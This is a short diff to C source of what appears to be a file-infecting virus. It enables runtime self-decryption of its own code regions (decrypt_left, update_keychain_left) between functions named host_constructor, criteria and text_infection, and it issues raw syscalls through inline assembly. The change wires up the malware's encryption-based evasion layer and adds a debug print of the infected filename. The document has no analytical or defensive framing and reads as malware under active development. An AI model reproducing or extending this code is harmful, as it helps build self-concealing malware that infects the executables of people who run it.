@@ -89,7 +89,8 @@ __attribute__((always_inline)) static inline int _close(int fd)
 	asm volatile
 	(
 		"mov edi, %0\n"
-		"mov rax, 3\n"
+
+		"mov rax, 0x3\n"
 		"syscall\n"
 		:
 		: "g"(fd)
@@ -110,7 +111,10 @@ __attribute__((always_inline)) static inline int _close(int fd)
 
 void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename, enum e_context context)
 {
-	printf("%s\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
+	decrypt_left(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
+
+	printf("%s\n\n", filename);
+	printf("%s\t%s\n", __PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
 	if (context == FAILURE)
 		goto label;
 
@@ -139,8 +143,8 @@ void host_constructor(struct s_host *host, struct s_keychain *keychain, const ch
 label:
 	_close(fd);
 
-//	update_keychain_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
-//	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
+	update_keychain_left(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
+	decrypt_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
 
 	criteria(host, keychain, context);
 }
